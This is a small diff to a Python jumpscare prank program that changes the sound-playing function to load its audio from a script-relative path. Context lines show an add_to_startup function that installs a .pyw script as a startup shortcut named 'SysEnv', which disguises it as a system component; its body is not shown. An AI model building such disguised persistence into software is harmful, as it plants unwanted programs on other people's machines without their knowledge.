@@ -75,8 +75,12 @@ def show_fullscreen_jumpscare():
     root.mainloop()
 
 def play_sound():
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+
+    audio_path = os.path.join(script_dir, 'audio', 'sound.mp3')
     pygame.mixer.init()
-    pygame.mixer.music.load("jumpscare/jumpscare.mp3")
+    pygame.mixer.music.load(audio_path)
     pygame.mixer.music.play()
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
